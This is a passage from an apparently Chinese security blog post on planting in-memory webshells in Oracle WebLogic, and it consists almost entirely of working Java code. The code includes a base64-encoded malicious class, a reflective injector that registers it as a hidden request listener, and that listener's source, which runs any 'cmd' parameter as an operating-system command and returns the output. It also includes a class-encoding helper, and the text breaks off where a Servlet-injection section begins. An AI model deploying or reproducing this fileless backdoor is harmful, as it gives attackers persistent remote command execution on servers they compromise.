class="s">&#34;yv66vgAAADQAdwoAGAA8CgA9AD4IADELAD8AQAoAQQBCCgBBAEMHAEQHAEUKAEYARwoACABICgAHAEkHAEoKAAwAPAoABwBLCgAMAEwIAE0KAAwATgcATwoAEgBQCgBRAFIKAFMAVAcAVQcAVgcAVwcAWAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9leGFtcGxlL3dlYi9teUxpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEAAnBzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAAmJyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQAIcmVzcG9uc2UBAC9Md2VibG9naWMvc2VydmxldC9pbnRlcm5hbC9TZXJ2bGV0UmVzcG9uc2VJbXBsOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAFYHAFkHAFoHAFsHAEQHAEoHAFUBAApTb3VyY2VGaWxlAQAPbXlMaXN0ZW5lci5qYXZhDAAaABsHAFkMAFwAXQcAXgwAXwBgBwBhDABiAGMMAGQAZQEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBbDABmAGcMABoAaAwAGgBpAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAagBrDABsAG0BAAQ8YnI+DABuAGsBACx3ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXF1ZXN0SW1wbAwAbwBwBwBxDAByAHMHAHQMAHUAdgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpjb20vZXhhbXBsZS93ZWIvbXlMaXN0ZW5lcgEAEGphdmEvbGFuZy9PYmplY3QBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQBABBqYXZhL2xhbmcvU3RyaW5nAQARamF2YS9sYW5nL1Byb2Nlc3MBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAIdG9TdHJpbmcBAAtnZXRSZXNwb25zZQEAMSgpTHdlYmxvZ2ljL3NlcnZsZXQvaW50ZXJuYWwvU2VydmxldFJlc3BvbnNlSW1wbDsBAC13ZWJsb2dpYy9zZXJ2bGV0L2ludGVybmFsL1NlcnZsZXRSZXNwb25zZUltcGwBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhABcAGAABABkAAAADAAEAGgAbAAEAHAAAAC8AAQABAAAABSq3AAGxAAAAAgAdAAAABgABAAAADAAeAAAADAABAAAABQAfACAAAAABACEAIgABABwAAAA1AAAAAgAAAAGxAAAAAgAdAAAABgABAAAAEAAeAAAAFgACAAAAAQAfACAAAAAAAAEAIwAkAAEAAQAlACIAAQAcAAABXwAFAAkAAAByK7YAAhIDuQAEAgBNLMYAZLgABSy2AAZOuwAHWbsACFkttgAJtwAKtwALOgS7AAxZtwANOgUZBLYADlk6BsYAExkFGQa2AA8SELYAD1en/+gZBbYAEToHK7YAAsAAErYAEzoIGQi2ABQZB7YAFacABE6xAAEAEABtAHAAFgADAB0AAAA2AA0AAAAUAAwAFQAQABcAGAAYACwAGQA1ABsAQAAcAFAAHgBXAB8AYwAgAG0AIgBwACEAcQAkAB4AAABcAAkAGABVACYAJwADACwAQQAoACkABAA1ADgAKgArAAUAPQAwACwALQAGAFcAFgAuAC0ABwBjAAoALwAwAAgAAAByAB8AIAAAAAAAcgAjACQAAQAMAGYAMQAtAAIAMgAAADUABP8ANQAGBwAzBwA0BwA1BwA2BwA3BwA4AAD8ABoHADX/AB8AAwcAMwcANAcANQABBwA5AAABADoAAAACADs=&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">encode_class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//这里为了适配weblogic 1036 必须反射获取webAppServletContext中的classLoader
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">loader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ClassLoader</span> <span class="n">ClassLoader0</span><span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">loader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Class</span> <span class="n">filter_class</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">//获取ChangeAwareClassLoader，因为cachedClasses这个变量在ChangeAwareClassLoader中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">classLoader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ClassLoader</span> <span class="n">classLoader1</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">classLoader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//获取cachedClasses
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">Field</span> <span class="n">cachedClasses</span> <span class="o">=</span> <span class="n">classLoader1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;cachedClasses&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">cachedClasses</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Object</span> <span class="n">cachedClasses_map</span> <span class="o">=</span> <span class="n">cachedClasses</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">classLoader1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Method</span> <span class="n">get</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;get&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">get</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//如果cachedClasses中不存在cmdListener类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">get</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdListener&#34;</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">//把cmdListener的class 存入cachedClasses中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">Method</span> <span class="n">put</span> <span class="o">=</span> <span class="n">cachedClasses_map</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&#34;put&#34;</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">put</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">put</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">cachedClasses_map</span><span class="o">,</span> <span class="s">&#34;cmdListener&#34;</span><span class="o">,</span> <span class="n">filter_class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="n">Field</span> <span class="n">eM</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;eventsManager&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">eM</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">EventsManager</span> <span class="n">eventsManager</span><span class="o">=(</span><span class="n">EventsManager</span><span class="o">)</span><span class="n">eM</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">//Weblogic 12.1.3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="c1">//创建EventListener
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">Method</span> <span class="n">listen</span><span class="o">=</span><span class="n">eventsManager</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;createListener&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listen</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">EventListener</span> <span class="n">listener</span><span class="o">=(</span><span class="n">EventListener</span><span class="o">)</span><span class="n">listen</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">eventsManager</span><span class="o">,</span><span class="s">&#34;cmdListener&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="c1">//调用addEventListener添加Listener
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">Method</span> <span class="n">addListener</span> <span class="o">=</span> <span class="n">eventsManager</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;addEventListener&#34;</span><span class="o">,</span> <span class="n">EventListener</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">addListener</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">addListener</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">eventsManager</span><span class="o">,</span><span class="n">listener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;success!!!&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">                    <span class="c1">//weblogic1036 可以直接调用registerListener添加
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">Method</span> <span class="n">listen</span><span class="o">=</span><span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;registerListener&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listen</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listen</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">,</span><span class="s">&#34;cmdListener&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="s">&#34;success!!!&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>恶意Listener</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletResponseImpl</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.ServletRequestEvent</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.ServletRequestListener</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">myListener</span> <span class="kd">implements</span> <span class="n">ServletRequestListener</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestDestroyed</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">servletRequestEvent</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">().</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Process</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">ps</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
</span></span><span class="line"><span class="cl">                <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">line</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;&lt;br&gt;&#34;</span><span class="o">);</span><span class="c1">//执行结果加上回车
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">ServletResponseImpl</span> <span class="n">response</span><span class="o">=</span> <span class="o">((</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">servletRequestEvent</span><span class="o">.</span><span class="na">getServletRequest</span><span class="o">()).</span><span class="na">getResponse</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>base64脚本，用于编码class文件。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">test1</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sun.misc.BASE64Encoder</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;/Users/myzxcg/xx/IdeaProjects/web/target/classes/com/example/web/myListener.class&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">FileInputStream</span> <span class="n">fileInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">4096</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">len</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="o">((</span><span class="n">len</span> <span class="o">=</span> <span class="n">fileInputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">))!=-</span><span class="n">1</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">                <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span><span class="n">0</span><span class="o">,</span><span class="n">len</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">encode</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Encoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encode</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;\\r|\\n&#34;</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="servlet"><a href="#servlet" class="anchor-link">#</a><a href="#contents:servlet" class="headings">Servlet</a></h2>
<p>只需要在servletMapping中添加URI和对应的URLMatchHelper对象即可。
<strong>实现代码</strong></p>
<p>在Weblogic 1036和weblogic 12.1.3测试成功。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
